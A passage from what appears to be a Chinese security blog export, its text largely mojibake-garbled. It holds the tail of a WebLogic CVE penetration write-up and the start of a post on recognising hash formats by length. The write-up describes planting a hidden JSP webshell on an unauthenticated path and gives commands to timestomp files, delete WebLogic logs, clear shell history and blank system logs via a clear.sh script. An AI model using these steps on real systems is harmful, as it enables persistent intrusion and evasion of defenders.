<p><img src="/post/CVE-Test/image-20231201001110687.png" alt="image-20231201001110687"></p>
<p>ä½†æ˜¯ç›´æ¥åœ¨å½“å‰æœåŠ¡ç«¯ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶å¤ªå®¹æ˜“è¢«æ£€æµ‹åˆ°ï¼Œæ‰€ä»¥æœ€å¥½çš„åŠæ³•å°±æ˜¯å°†jspä¸€å¥è¯æœ¨é©¬å†™å…¥å·²æœ‰çš„jspæ–‡ä»¶ä¸­ï¼Œ</p>
<p>å…ˆæ‰¾ä¸€ä¸‹å½“å‰ç›®å½•çš„jspæ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name <span class="string">&quot;*.jsp&quot;</span> 2&gt; /dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20231201111621945.png" alt="image-20231201111621945"></p>
<p>å¾ˆå¿«å°±ä¼šå‘ç°æœ€åä¸€ä¸ªæ–‡ä»¶ï¼Œ</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/home/</span>ttoc<span class="regexp">/Oracle/</span>Middleware<span class="regexp">/Oracle_Home/</span>wlserver<span class="regexp">/server/</span>lib<span class="regexp">/consoleapp/</span>consolehelp/index.jsp</span><br></pre></td></tr></table></figure>

<p>åšä¸ºindex.jspè‚¯å®šå¯ä»¥è¢«ç›´æ¥è®¿é—®ï¼Œè€Œä¸”åœ¨consolehelpè·¯ç”±ä¸‹ï¼Œæ‰€ä»¥æ˜¯ä¸éœ€è¦ç™»å½•è®¿é—®çš„ï¼Œäºæ˜¯å°†1.jspå†…å®¹é™„åŠ åˆ°index.jspçš„åé¢ï¼Œç„¶ååˆ é™¤1.jsp</p>
<p>å…ˆç§»åŠ¨1.jspåˆ°index.jspæ‰€åœ¨ç›®å½•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> 1.jsp  /home/ttoc/Oracle/Middleware/Oracle_Home/wlserver/server/lib/consoleapp/consolehelp/</span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20231201112427314.png" alt="image-20231201112427314"></p>
<p>ç„¶åå°†å†…å®¹è¿½åŠ åˆ°index.jspä¸­</p>
<p><img src="/post/CVE-Test/image-20231201112511153.png" alt="image-20231201112511153"></p>
<p>ç„¶ååˆ æ‰1.jspå¹¶ä¸ºindex.jspèµ‹æ‰§è¡Œæƒé™</p>
<p><img src="/post/CVE-Test/image-20231201113317976.png" alt="image-20231201113317976"></p>
<p>ä½†æ˜¯è®¿é—®index.jspæ–‡ä»¶æ—¶ï¼Œå‘ç°å¹¶æ²¡æœ‰å˜åŒ–ï¼Œå“ªæ€•åˆ æ‰ä¹Ÿä¾æ—§æ­£å¸¸è®¿é—®ï¼Œè¿™æ˜¯å› ä¸ºweblogicæœ‰ä¸¤ç§æ¨¡å¼ï¼Œä¸€ç§æ˜¯å¼€å‘è€…æ¨¡å¼ï¼Œä¸€ç§æ˜¯ç”Ÿäº§æ¨¡å¼ï¼Œé»˜è®¤æ˜¯ç”Ÿäº§æ¨¡å¼ï¼Œè¯¥æ¨¡å¼ä¸‹ï¼Œä¿®æ”¹çš„æ–‡ä»¶ä¸ä¼šè¢«éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šï¼Œå®ƒæœ‰è‡ªå·±çš„ä¸€ä¸ªéƒ¨ç½²ç›®å½•ï¼Œè€Œç”Ÿäº§æ¨¡å¼æ‰ä¼šå°†ä¿®æ”¹æ–‡ä»¶é‡æ–°éƒ¨ç½²ï¼Œæ‰€ä»¥äºæ˜¯æˆ‘æ¢äº†ä¸ªæ€è·¯ã€‚</p>
<p>åªæ˜¯ä¸ºäº†é˜²æ­¢ç®¡ç†å‘˜å‘ç°è€Œå·²ç”Ÿæˆæ–‡ä»¶ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ç”Ÿæˆä¸€ä¸ªéšè—æ–‡ä»¶ .index.jspï¼Œè™½ç„¶ç”Ÿäº§æ¨¡å¼ä¸ä¼šéƒ¨ç½²ä¿®æ”¹æ–‡ä»¶ï¼Œä½†æ˜¯æ–°å»ºæ–‡ä»¶è¿˜æ˜¯ä¼šè¿›è¡Œéƒ¨ç½²ï¼Œäºæ˜¯å†ç”Ÿæˆä¸€ä¸ª.index.jspæ–‡ä»¶å¹¶å†™å…¥jspä¸€å¥è¯æœ¨é©¬ï¼Œå¹¶index.jspå°±æ¢å¤åŸæ¥ä»£ç ä»¥åŠæƒé™çŠ¶æ€ã€‚</p>
<p><img src="/post/CVE-Test/image-20231201115947536.png" alt="image-20231201115947536"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">chmod</span> <span class="number">640</span> index.jsp</span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20231201120655450.png" alt="image-20231201120655450"></p>
<p>å†æ¬¡å°è¯•èšå‰‘è¿æ¥ï¼Œ</p>
<p><img src="/post/CVE-Test/image-20231201120113628.png" alt="image-20231201120113628"></p>
<p>è¿æ¥æˆåŠŸï¼Œå¹¶ä¸”å¯ä»¥æ­£å¸¸è®¿é—®</p>
<p><img src="/post/CVE-Test/image-20231201120153540.png" alt="image-20231201120153540"></p>
<h3 id="ç—•è¿¹æ¸…ç†"><a href="#ç—•è¿¹æ¸…ç†" class="headerlink" title="ç—•è¿¹æ¸…ç†"></a>ç—•è¿¹æ¸…ç†</h3><p>ç”±äºæˆ‘ä»¬æ‰§è¡Œäº†å¤§é‡å‘½ä»¤ï¼Œå¹¶ä¸”ç”Ÿæˆå’Œä¿®æ”¹äº†éƒ¨åˆ†ç›®å½•å’Œæ–‡ä»¶ï¼Œæ‰€ä»¥å½“ç®¡ç†å‘˜è¿›è¡Œæ£€æµ‹æœåŠ¡å™¨æœ€è¿‘æ›´æ–°æƒ…å†µå°±ä¼šå¾ˆå¿«å‘ç°è¯¥æ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦åˆ é™¤å‘½ä»¤æ‰§è¡Œæ—¥å¿—ï¼Œå¹¶ä¿®æ”¹æ–‡ä»¶ï¼Œç›®å½•ç”Ÿæˆå’Œä¿®æ”¹æ—¶é—´å’Œå…¶ä»–ä¸€æ ·</p>
<h4 id="ä¿®æ”¹æ—¶é—´"><a href="#ä¿®æ”¹æ—¶é—´" class="headerlink" title="ä¿®æ”¹æ—¶é—´"></a>ä¿®æ”¹æ—¶é—´</h4><p>å…ˆä¿®æ”¹.index.jspæ‰€åœ¨ç›®å½•ä¸‹çš„ï¼Œ</p>
<p><img src="/post/CVE-Test/image-20231201120819297.png" alt="image-20231201120819297"></p>
<p>å‘ç°ä¸»è¦å°±ä¸‰ä¸ªéƒ¨åˆ†ï¼Œå½“å‰ç›®å½•ä¿®æ”¹æ—¶é—´ï¼Œindex.jspå’Œ.index.jspçš„ä¿®æ”¹æ—¶é—´ï¼Œ</p>
<p>ç—•è¿¹æ¸…é™¤æœ€å¥½å’Œå…¶ä»–åŒå±æ€§æ–‡ä»¶æ—¶é—´ä¸€è‡´ï¼Œå¯ä»¥çœ‹åˆ°æ–‡ä»¶æœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´ç»Ÿä¸€ä¸º</p>
<blockquote>
<p>Nov 23  2016 </p>
</blockquote>
<p>è€Œç›®å½•ä¿®æ”¹æ—¶é—´ç»Ÿä¸€ä¸º</p>
<blockquote>
<p>Nov 27 04:51</p>
</blockquote>
<p>äºæ˜¯æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight irpf90"><table><tr><td class="code"><pre><span class="line"><span class="keyword">touch</span> -t <span class="number">201611230000</span> <span class="built_in">index</span>.jsp .<span class="built_in">index</span>.jsp</span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20231201121316063.png" alt="image-20231201121316063"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">touch</span> -t <span class="number">11270451</span> ./</span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20231201121529910.png" alt="image-20231201121529910"></p>
<p>æœ€åæ•´ä½“ç›®å½•å°±æ­£å¸¸äº†ï¼Œæ—¶é—´ä¹Ÿéƒ½æ­£å¸¸äº†</p>
<p><img src="/post/CVE-Test/image-20231201121609229.png" alt="image-20231201121609229"></p>
<p>ç„¶åæ˜¯å¼€å§‹å°è¯•çš„cssç›®å½•</p>
<p><img src="/post/CVE-Test/image-20231201121742343.png" alt="image-20231201121742343"></p>
<p>æ—¶é—´ä¸€è‡´ï¼Œæ‰€ä»¥å‘½ä»¤ä¿®æ”¹ä¸€ä¸‹å³å¯</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">touch</span> -t <span class="number">11270451</span> css</span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20231201121843879.png" alt="image-20231201121843879"></p>
<h4 id="åˆ é™¤weblogicæœåŠ¡æ—¥å¿—"><a href="#åˆ é™¤weblogicæœåŠ¡æ—¥å¿—" class="headerlink" title="åˆ é™¤weblogicæœåŠ¡æ—¥å¿—"></a>åˆ é™¤weblogicæœåŠ¡æ—¥å¿—</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/home/</span>ttoc<span class="regexp">/Oracle/</span>Middleware<span class="regexp">/Oracle_Home/u</span>ser_projects<span class="regexp">/domains/</span>base_domain<span class="regexp">/servers/</span>AdminServer/logs</span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20231201124945937.png" alt="image-20231201124945937"></p>
<p>ä¸»è¦æ˜¯ä¸€äº›æœåŠ¡å¯åŠ¨æ—¥å¿—å’Œè®¿é—®æƒ…å†µæ—¥å¿—ï¼Œå¯ä»¥ç›´æ¥éƒ½åˆ é™¤ï¼Œé™¤äº†æ–‡ä»¶å¤¹å¯ä»¥ä¿ç•™</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> *</span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20231201125234934.png" alt="image-20231201125234934"></p>
<p>ç„¶åå°†æ—¥å¿—ç›®å½•ä¿®æ”¹æ—¶é—´æ”¹ä¸€ä¸‹ï¼Œå’Œå…¶ä»–ä¸€è‡´</p>
<p><img src="/post/CVE-Test/image-20231201125315971.png" alt="image-20231201125315971"></p>
<p>æ‰§è¡Œå‘½ä»¤ï¼Œ</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">touch</span> -t <span class="number">11292033</span> ./</span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20231201125405018.png" alt="image-20231201125405018"></p>
<h4 id="åˆ é™¤ç³»ç»Ÿæ—¥å¿—"><a href="#åˆ é™¤ç³»ç»Ÿæ—¥å¿—" class="headerlink" title="åˆ é™¤ç³»ç»Ÿæ—¥å¿—"></a>åˆ é™¤ç³»ç»Ÿæ—¥å¿—</h4><p>æ–‡ä»¶æ—¶é—´ä¿®æ”¹å®Œäº†å°±æ˜¯åˆ é™¤å‘½ä»¤å†å²è®°å½•ä»¥åŠæ—¥å¿—æ–‡ä»¶ï¼Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">histroy -r          <span class="comment">#åˆ é™¤å½“å‰ä¼šè¯å†å²è®°å½•</span></span><br><span class="line"><span class="built_in">history</span> -c          <span class="comment">#åˆ é™¤å†…å­˜ä¸­çš„æ‰€æœ‰å‘½ä»¤å†å²</span></span><br><span class="line"><span class="built_in">rm</span> .bash_history   <span class="comment">#åˆ é™¤å†å²æ–‡ä»¶ä¸­çš„å†…å®¹</span></span><br><span class="line">HISTZISE=0          <span class="comment">#é€šè¿‡è®¾ç½®å†å²å‘½ä»¤æ¡æ•°æ¥æ¸…é™¤æ‰€æœ‰å†å²è®°å½•</span></span><br></pre></td></tr></table></figure>

<p>å†ä½¿ç”¨vimæ‰“å¼€ï¼Œæ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼Œ</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">:<span class="built_in">set</span> <span class="attribute">history</span>=0</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†åˆ é™¤æ—¥å¿—æ–‡ä»¶</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">var</span>/<span class="keyword">run</span>/utmp è®°å½•ç°åœ¨ç™»å…¥çš„ç”¨æˆ·</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/wtmp è®°å½•ç”¨æˆ·æ‰€æœ‰çš„ç™»å…¥å’Œç™»å‡º</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/lastlog è®°å½•æ¯ä¸€ä¸ªç”¨æˆ·æœ€åç™»å…¥æ—¶é—´</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/btmp è®°å½•é”™è¯¯çš„ç™»å…¥å°è¯•</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/auth.<span class="keyword">log</span> éœ€è¦èº«ä»½ç¡®è®¤çš„æ“ä½œ</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/secure è®°å½•å®‰å…¨ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/maillog è®°å½•é‚®ä»¶ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/message è®°å½•ç³»ç»Ÿå¯åŠ¨åçš„ä¿¡æ¯å’Œé”™è¯¯æ—¥å¿—</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/cron è®°å½•å®šæ—¶ä»»åŠ¡ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/spooler è®°å½•UUCPå’Œ<span class="keyword">news</span>è®¾å¤‡ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯</span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/<span class="keyword">boot</span>.<span class="keyword">log</span> è®°å½•å®ˆæŠ¤è¿›ç¨‹å¯åŠ¨å’Œåœæ­¢ç›¸å…³çš„æ—¥å¿—æ¶ˆæ¯</span><br></pre></td></tr></table></figure>

<p>æœ€åæ±‡æ€»å¯ä»¥ä¸€ä¸ªè„šæœ¬è§£å†³é—®é¢˜ï¼Œåªæ˜¯viméœ€è¦è‡ªå·±æ“ä½œä¸€ä¸‹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/syslog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/messages</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/httpd/access_log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/httpd/error_log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/xferlog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/secure</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/auth.log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/user.log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/wtmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/lastlog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/btmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/run/utmp</span><br><span class="line"><span class="built_in">rm</span> ~/.bash_history</span><br><span class="line"><span class="built_in">history</span> -c</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆæ¥åˆ°ç”¨æˆ·ç›®å½•~ï¼Œ</p>
<p><img src="/post/CVE-Test/image-20231201122459733.png" alt="image-20231201122459733"></p>
<p>ç”Ÿæˆæ¸…é™¤ç—•è¿¹è„šæœ¬æ–‡ä»¶ï¼Œ</p>
<p><img src="/post/CVE-Test/image-20231201124049869.png" alt="image-20231201124049869"></p>
<p>ç„¶åèµ‹æ‰§è¡Œæƒé™ï¼Œ</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">chmod 777 <span class="keyword">clear</span>.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20231201124410575.png" alt="image-20231201124410575"></p>
<p>ç„¶åæ¸…ç©ºvimè®°å½•ï¼Œ</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">:<span class="built_in">set</span> <span class="attribute">history</span>=0</span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20231201123307378.png" alt="image-20231201123307378"></p>
<p>æœ€ååˆ æ‰.viminfo ï¼Œå…¶ä¸­æœ‰å¤§é‡å½“å‰ç”¨æˆ·æ‰§è¡Œçš„ç”¨vimç”Ÿæˆçš„æ–‡æ¡£æ—¥å¿—</p>
<p><img src="/post/CVE-Test/image-20231201123614967.png" alt="image-20231201123614967"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> .viminfo</span><br></pre></td></tr></table></figure>

<p>æœ€åå†æ¬¡æ‰§è¡Œè„šæœ¬æ¸…ç©ºç³»ç»Ÿæ—¥å¿—å’Œå‘½ä»¤æ‰§è¡Œå†å²ï¼Œå› ä¸ºæ˜¯weblogicæœåŠ¡ï¼Œæ‰€ä»¥æ²¡æœ‰ç”¨httpdï¼Œæ‰€ä»¥æ²¡æœ‰æ—¥å¿—ã€‚</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">./<span class="keyword">clear</span>.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20231201122754841.png" alt="image-20231201122754841"></p>
<p><img src="/post/CVE-Test/image-20231201125647334.png" alt="image-20231201125647334"></p>
<p>æœ€åä¸€æ­¥åˆ é™¤clear.shï¼Œå†ä¿®æ”¹æ—¶é—´ï¼Œå³å¯</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">rm</span> <span class="keyword">clear</span>.<span class="keyword">sh</span>;touch -t 11270436 ./ </span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20231201125831451.png" alt="image-20231201125831451"></p>
<p>ç—•è¿¹æ¸…ç†å®Œæˆï¼Œæ¸—é€å®Œæ¯•</p>
<h3 id="é™„åŠ ç”¨javaå·¥å…·"><a href="#é™„åŠ ç”¨javaå·¥å…·" class="headerlink" title="é™„åŠ ç”¨javaå·¥å…·"></a>é™„åŠ ç”¨javaå·¥å…·</h3><p>åœ¨java17ç¯å¢ƒä¸‹è¿è¡Œè„šæœ¬å‘ç”Ÿé—®é¢˜ï¼Œ</p>
<p><img src="/post/CVE-Test/image-20231201213653846.png" alt="image-20231201213653846"></p>
<p>è¿™ä¸ªé”™è¯¯æ˜¯ç”±äºJava 9ä¸­å·²ç»å¼ƒç”¨äº†java.corbaæ¨¡å—ï¼ˆä¾‹å¦‚ï¼Œorg.omg.CORBA*åŒ…ï¼‰ï¼Œè€Œåœ¨Java 11ä¸­ï¼Œè¯¥æ¨¡å—å·²ç»ä¸å†å¯ç”¨ã€‚å¼ƒç”¨æ¨¡å—æ„å‘³ç€é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¨¡å—ä¸­çš„ç±»åœ¨ç±»è·¯å¾„ä¸­ä¸å¯ç”¨ã€‚</p>
<p>å¯¹äºJava 9å’Œ10ï¼Œä½ éœ€è¦åœ¨å‘½ä»¤è¡Œä¸­åŒ…å«<code>--add-module java.corba</code>é€‰é¡¹ä»¥å°†å®ƒä»¬æ·»åŠ åˆ°ç±»è·¯å¾„ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªé€‰é¡¹åœ¨Java 11ä¸­ä¸å¯ç”¨ã€‚</p>
<p>æ‰€ä»¥å¯¹äºJava 11ä»¥åŠä¹‹åçš„ç‰ˆæœ¬ï¼Œéœ€è¦ä»åœ¨çº¿èµ„æºä¸­ä¸‹è½½GlassFish CORBA JARæ–‡ä»¶ï¼Œå¹¶å°†å®ƒä»¬æ·»åŠ åˆ°Java 11çš„ç±»è·¯å¾„ï¼Œ</p>
<ul>
<li>glassfish-corba-omgapi.jar</li>
<li>glassfish-corba-orb.jar</li>
<li>glassfish-corba-internal-api.jar</li>
<li>pfl-basic.jar</li>
<li>pfl-tf.jar</li>
</ul>
<p>å½“ç„¶æœ€ç®€å•çš„å°±æ˜¯åˆ‡æ¢å·¥å…·æ‰€åœ¨javaç¯å¢ƒé™ä½ç‰ˆæœ¬ï¼Œäºæ˜¯æˆ‘å°†ä¸»æœºçš„javaç¯å¢ƒé™ä½ä¸º<code>jdk1.8.0_171</code></p>
<p><img src="/post/CVE-Test/image-20231201213957613.png" alt="image-20231201213957613"></p>
<p>å°±å¯ä»¥æˆåŠŸæ‰§è¡Œï¼Œå¹¶æˆåŠŸåå¼¹shell</p>
<p><img src="/post/CVE-Test/image-20231201214138728.png" alt="image-20231201214138728"></p>
<p><img src="/post/CVE-Test/image-20231201214155986.png" alt="image-20231201214155986"></p>
<h1 id="CVE-2022-39197-Cobaltstrike-RCE"><a href="#CVE-2022-39197-Cobaltstrike-RCE" class="headerlink" title="CVE-2022-39197 Cobaltstrike RCE"></a>CVE-2022-39197 Cobaltstrike RCE</h1>]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>æ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>åŠ å¯†å¯†æ–‡ç‰¹å¾</title>
    <url>//post/Encrypted-ciphertext-features/</url>
    <content><![CDATA[<p><a href="https://blog.51cto.com/u_15274949/2931589">åŸæ–‡é“¾æ¥</a></p>
<span id="more"></span>

<h2 id="1ã€MD5â€”â€”ç¤ºä¾‹"><a href="#1ã€MD5â€”â€”ç¤ºä¾‹" class="headerlink" title="1ã€MD5â€”â€”ç¤ºä¾‹"></a>1ã€MD5â€”â€”ç¤ºä¾‹</h2><p><u><strong>21232F297A57A5A743894A0E4A801FC3</strong></u></p>
<p>ä¸€èˆ¬MD5å€¼æ˜¯<u>32ä½</u>ç”±æ•°å­—<code>0-9</code>å’Œå­—æ¯<code>a-f</code>æ‰€ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œå¦‚å›¾ã€‚<u>å¦‚æœå‡ºç°è¿™ä¸ªèŒƒå›´ä»¥å¤–çš„å­—ç¬¦è¯´æ˜è¿™å¯èƒ½æ˜¯ä¸ªé”™è¯¯çš„md5å€¼</u>ï¼Œå°±æ²¡å¿…è¦å†æ‹¿å»è§£å¯†äº†ã€‚16ä½å€¼æ˜¯å–çš„æ˜¯8~24ä½ã€‚</p>
<p><img src="/post/Encrypted-ciphertext-features/image-20220721175149372.png" alt="image-20220721175149372"></p>
<p>md5çš„ä¸‰ä¸ªç‰¹å¾ï¼š</p>
<p>1.<strong>ç¡®å®šæ€§</strong>ï¼šä¸€ä¸ªåŸå§‹æ•°æ®çš„MD5å€¼æ˜¯å”¯ä¸€çš„ï¼ŒåŒä¸€ä¸ªåŸå§‹æ•°æ®ä¸å¯èƒ½ä¼šè®¡ç®—å‡ºå¤šä¸ªä¸åŒçš„MD5å€¼ã€‚</p>
<p>2.<strong>ç¢°æ’æ€§</strong>ï¼š<u>åŸå§‹æ•°æ®ä¸å…¶MD5å€¼å¹¶ä¸æ˜¯ä¸€ä¸€å¯¹åº”çš„</u>ï¼Œæœ‰å¯èƒ½å¤šä¸ªåŸå§‹æ•°æ®è®¡ç®—å‡ºæ¥çš„MD5å€¼æ˜¯ä¸€æ ·çš„ï¼Œè¿™å°±æ˜¯ç¢°æ’ã€‚</p>
<p>3.<strong>ä¸å¯é€†</strong>ï¼šä¹Ÿå°±æ˜¯è¯´å¦‚æœå‘Šè¯‰ä½ ä¸€ä¸ªMD5å€¼ï¼Œä½ æ˜¯æ— æ³•é€šè¿‡å®ƒè¿˜åŸå‡ºå®ƒçš„åŸå§‹æ•°æ®çš„ï¼Œè¿™ä¸æ˜¯ä½ çš„æŠ€æœ¯ä¸å¤Ÿç‰›ï¼Œè¿™æ˜¯ç”±å®ƒçš„ç®—æ³•æ‰€å†³å®šçš„ã€‚å› ä¸ºæ ¹æ®ç¬¬2ç‚¹ï¼Œ<u>ä¸€ä¸ªç»™å®šçš„MD5å€¼æ˜¯å¯èƒ½å¯¹åº”å¤šä¸ªåŸå§‹æ•°æ®çš„</u>ï¼Œå¹¶ä¸”ç†è®ºä¸Šè®²æ˜¯å¯ä»¥å¯¹åº”æ— é™å¤šä¸ªåŸå§‹æ•°æ®ï¼Œæ‰€æœ‰æ— æ³•ç¡®å®šåˆ°åº•æ˜¯ç”±å“ªä¸ªåŸå§‹æ•°æ®äº§ç”Ÿçš„ã€‚</p>
<h2 id="2ã€sha1â€”â€”ç¤ºä¾‹"><a href="#2ã€sha1â€”â€”ç¤ºä¾‹" class="headerlink" title="2ã€sha1â€”â€”ç¤ºä¾‹"></a>2ã€sha1â€”â€”ç¤ºä¾‹</h2><p><u><strong>d033e22ae348aeb5660fc2140aec35850c4da997</strong></u></p>
<p>è¿™ç§åŠ å¯†çš„å¯†æ–‡ç‰¹å¾è·ŸMD5å·®ä¸å¤šï¼Œåªä¸è¿‡<u>ä½æ•°æ˜¯40</u></p>
<p><img src="/post/Encrypted-ciphertext-features/image-20220721175316568.png" alt="image-20220721175316568"></p>
<h2 id="3ã€HMACç®—æ³•â€”â€”ç¤ºä¾‹"><a href="#3ã€HMACç®—æ³•â€”â€”ç¤ºä¾‹" class="headerlink" title="3ã€HMACç®—æ³•â€”â€”ç¤ºä¾‹"></a>3ã€HMACç®—æ³•â€”â€”ç¤ºä¾‹</h2><p><u><strong>5b696ae7da9442ead7adc24d03cedb65</strong></u></p>
<p>HMAC (Hash-based Message Authentication Code) å¸¸ç”¨äºæ¥å£ç­¾åéªŒè¯ï¼Œè¿™ç§ç®—æ³•å°±æ˜¯åœ¨å‰ä¸¤ç§åŠ å¯†çš„åŸºç¡€ä¸Šå¼•å…¥äº†ç§˜é’¥ï¼Œè€Œç§˜é’¥åˆåªæœ‰ä¼ è¾“åŒæ–¹æ‰çŸ¥é“ï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šæ˜¯ç ´è§£ä¸äº†çš„</p>
<p><img src="/post/Encrypted-ciphertext-features/image-20220721175340163.png" alt="image-20220721175340163"></p>
<h2 id="4ã€NTLMâ€”â€”ç¤ºä¾‹"><a href="#4ã€NTLMâ€”â€”ç¤ºä¾‹" class="headerlink" title="4ã€NTLMâ€”â€”ç¤ºä¾‹"></a>4ã€NTLMâ€”â€”ç¤ºä¾‹</h2><p><u><strong>209c6174da490caeb422f3fa5a7ae634</strong></u></p>
<p>è¿™ç§åŠ å¯†æ˜¯Windowsçš„å“ˆå¸Œå¯†ç ï¼Œæ˜¯ Windows NT æ—©æœŸç‰ˆæœ¬çš„æ ‡å‡†å®‰å…¨åè®®ã€‚ä¸å®ƒç›¸åŒçš„è¿˜æœ‰Domain Cached Credentialsï¼ˆåŸŸå“ˆå¸Œï¼‰ã€‚</p>
<p><img src="/post/Encrypted-ciphertext-features/image-20220721175431939.png" alt="image-20220721175431939"></p>
<h2 id="ç›¸ä¼¼åŠ å¯†ç±»å‹"><a href="#ç›¸ä¼¼åŠ å¯†ç±»å‹" class="headerlink" title="ç›¸ä¼¼åŠ å¯†ç±»å‹"></a>ç›¸ä¼¼åŠ å¯†ç±»å‹</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#    ç®—æ³•       é•¿åº¦</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">1</span> 	md5 	 <span class="number">32</span>/<span class="number">16</span></span><br><span class="line"><span class="attribute">2</span> 	sha1 	    <span class="number">40</span></span><br><span class="line"><span class="attribute">3</span> 	sha256 	    <span class="number">64</span></span><br><span class="line"><span class="attribute">4</span> 	sha512 	   <span class="number">128</span></span><br><span class="line"><span class="attribute">5</span> 	adler32 	 <span class="number">8</span></span><br><span class="line"><span class="attribute">6</span> 	crc32 	     <span class="number">8</span></span><br><span class="line"><span class="attribute">7</span> 	crc32b       <span class="number">8</span></span><br><span class="line"><span class="attribute">8</span> 	fnv132 	     <span class="number">8</span></span><br><span class="line"><span class="attribute">9</span> 	fnv164 	    <span class="number">16</span></span><br><span class="line"><span class="attribute">10</span> 	fnv1a32 	 <span class="number">8</span></span><br><span class="line"><span class="attribute">11</span> 	fnv1a64     <span class="number">16</span></span><br><span class="line"><span class="attribute">12</span> 	gost 	    <span class="number">64</span></span><br><span class="line"><span class="attribute">13</span> 	gost-crypto <span class="number">64</span></span><br><span class="line"><span class="attribute">14</span> 	haval128,<span class="number">3</span> 	<span class="number">32</span></span><br><span class="line"><span class="attribute">15</span> 	haval128,<span class="number">4</span> 	<span class="number">32</span></span><br><span class="line"><span class="attribute">16</span> 	haval128,<span class="number">5</span> 	<span class="number">32</span></span><br><span class="line"><span class="attribute">17</span> 	haval160,<span class="number">3</span> 	<span class="number">40</span></span><br><span class="line"><span class="attribute">18</span> 	haval160,<span class="number">4</span> 	<span class="number">40</span></span><br><span class="line"><span class="attribute">19</span> 	haval160,<span class="number">5</span> 	<span class="number">40</span></span><br><span class="line"><span class="attribute">20</span> 	haval192,<span class="number">3</span> 	<span class="number">48</span></span><br><span class="line"><span class="attribute">21</span> 	haval192,<span class="number">4</span> 	<span class="number">48</span></span><br><span class="line"><span class="attribute">22</span> 	haval192,<span class="number">5</span> 	<span class="number">48</span></span><br><span class="line"><span class="attribute">23</span> 	haval224,<span class="number">3</span> 	<span 